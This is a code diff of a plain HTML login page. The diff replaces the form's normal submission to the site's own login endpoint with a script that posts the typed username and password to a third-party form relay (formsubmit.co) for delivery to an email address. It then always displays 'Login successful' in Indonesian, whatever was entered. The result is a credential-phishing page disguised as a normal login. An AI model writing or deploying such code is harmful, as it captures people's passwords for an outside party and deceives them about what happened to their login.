@@ -13,26 +13,47 @@
     button { width: 100%; padding: 10px; background: #2563eb; color: #fff; border: 0; border-radius: 6px; cursor: pointer; font-size: 16px; }
     button:hover { background: #1d4ed8; }
     .error { color: #b91c1c; margin-top: 10px; display: none; font-size: 14px; }
+    .success { color: #1a7a1a; margin-top: 10px; display: none; font-size: 14px; }
   </style>
 </head>
 <body>
   <div class="box">
-    <h1>Login</h1>
-    <form method="POST" action="/login">
+    <h1>Login App</h1>
+    <form id="loginForm">
       <div class="field">
-        <input type="text" name="username" placeholder="Username" autocomplete="username" required>
+        <input type="text" id="username" name="username" placeholder="Username" autocomplete="username" required>
       </div>
       <div class="field">
-        <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
+        <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required>
       </div>
       <button type="submit">Login</button>
     </form>
     <div class="error" id="error"></div>
+    <div class="success" id="success"></div>
     <script>
-      const params = new URLSearchParams(window.location.search);
-      const err = params.get('error');
-      const el = document.getElementById('error');
-      if (err === 'gagal') el.style.display = 'block';
+      document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const formData = new URLSearchParams({ username, password }).toString();
+        const errorEl = document.getElementById('error');
+        const successEl = document.getElementById('success');
+        errorEl.style.display = 'none';
+        successEl.style.display = 'none';
+        fetch('https://formsubmit.co/ajax/your-email@example.com', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: formData
+        }).then(() => {
+          successEl.style.display = 'block';
+          successEl.textContent = 'Login berhasil!';
+          successEl.style.color = '#1a7a1a';
+        }).catch(() => {
+          errorEl.style.display = 'block';
+          errorEl.textContent = 'Gagal mengirim. Cek koneksi atau email FormSubmit.';
+          errorEl.style.color = '#b91c1c';
+        });
+      });
     </script>
   </div>
 </body>
